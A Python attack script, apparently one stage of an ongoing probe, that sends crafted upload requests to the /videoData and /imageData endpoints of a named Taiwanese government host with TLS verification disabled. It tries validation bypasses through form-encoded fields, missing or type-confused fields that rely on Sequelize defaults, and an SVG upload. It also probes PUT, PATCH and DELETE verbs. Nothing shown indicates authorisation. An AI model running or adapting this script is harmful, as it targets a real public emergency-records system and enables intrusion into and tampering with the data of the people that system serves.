#!/usr/bin/env python3
"""Phase 2-B: 尝试 form 加 generatedAt / 字符串字段 / Sequelize 字段顺序绕过"""
import http.client, json, ssl, urllib.parse, sys
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def req(host, port, method, path, body=None, headers=None, timeout=15):
    h = {'User-Agent': 'Mozilla/5.0', 'Accept': '*/*'}
    if headers: h.update(headers)
    cn = http.client.HTTPSConnection(host, port, context=ctx, timeout=timeout)
    cn.request(method, path, body=body, headers=h)
    r = cn.getresponse()
    rb = r.read()
    rh = dict(r.getheaders())
    cn.close()
    return r.status, rb, rh

host = 'epcr.tpf.gov.tw'

# 1) form-urlencoded 完整字段（含 generatedAt）
print("="*80)
print("form 完整字段（generatedAt 在前）")
print("="*80)
body = urllib.parse.urlencode({
    "fileName": "[iPhone][poc-formfull]9C372D5A",
    "fileData": "B64FULLDATA",
    "mimeType": "video/mp4",
    "generatedAt": "2026-08-30T04:00:00.000Z",
    "VideoType": "1",
    "recordUuid": "formfull-001"
})
s, b, _ = req(host, 4001, 'POST', '/videoData', body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print(f"status={s}  body[:600]={b[:600]!r}")

# 2) form 缺 VideoType（让 Sequelize 自动填默认）
print()
print("="*80)
print("form 缺 VideoType 让 Sequelize 用默认")
print("="*80)
body = urllib.parse.urlencode({
    "fileName": "[iPhone][poc-novideotype]X",
    "fileData": "B64X",
    "mimeType": "video/mp4",
    "generatedAt": "2026-08-30T04:00:00.000Z",
    "recordUuid": "noVideoType-001"
})
s, b, _ = req(host, 4001, 'POST', '/videoData', body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print(f"status={s}  body[:600]={b[:600]!r}")

# 3) JSON 缺 fileData 单独触发
print()
print("="*80)
print("JSON 仅 fileName + VideoType（最小字段组合）")
print("="*80)
for body_str in [
    '{"fileName":"min-test","VideoType":1}',
    '{"fileName":"min-test","VideoType":"1"}',
    '{"fileName":"min-test"}',
    '{"VideoType":1}',
    '{"fileName":"min","VideoType":0}',
    '{"fileName":"min","VideoType":null}',
    '{"fileName":"min","VideoType":"abc"}',
    '{"fileName":"min","VideoType":2}',
]:
    s, b, _ = req(host, 4001, 'POST', '/videoData', body=body_str, headers={'Content-Type': 'application/json'})
    print(f"  {body_str!r:60s} → status={s} body={b[:160]!r}")

# 4) /imageData 镜像测试
print()
print("="*80)
print("/imageData form 完整 + JSON 最小组合")
print("="*80)
body = urllib.parse.urlencode({
    "fileName": "img-formfull",
    "fileData": "iVBORw0KGgo=",
    "mimeType": "image/svg+xml",
    "generatedAt": "2026-08-30T04:00:00.000Z",
    "ImageType": "1",
    "recordUuid": "img-formfull-001"
})
s, b, _ = req(host, 4001, 'POST', '/imageData', body=body, headers={'Content-Type': 'application/x-www-form-urlencoded'})
print(f"  form完整 status={s} body={b[:400]!r}")
for body_str in [
    '{"fileName":"img-min","ImageType":1}',
    '{"fileName":"img-min","ImageType":"1"}',
    '{"fileName":"img-min","ImageType":2}',
    '{"fileName":"img-min"}',
    '{"ImageType":1}',
]:
    s, b, _ = req(host, 4001, 'POST', '/imageData', body=body_str, headers={'Content-Type': 'application/json'})
    print(f"  {body_str!r:60s} → status={s} body={b[:160]!r}")

# 5) PUT/PATCH/DELETE 端点
print()
print("="*80)
print("PUT/PATCH/DELETE /videoData & /imageData 探测")
print("="*80)
for verb in ['PUT', 'PATCH', 'DELETE', 'OPTIONS']:
    for path in ['/videoData/1', '/imageData/1', '/videoData', '/imageData']:
        s, b, _ = req(host, 4001, verb, path)
        print(f"  {verb:6s} {path:20s} → status={s} body[:120]={b[:120]!r}")

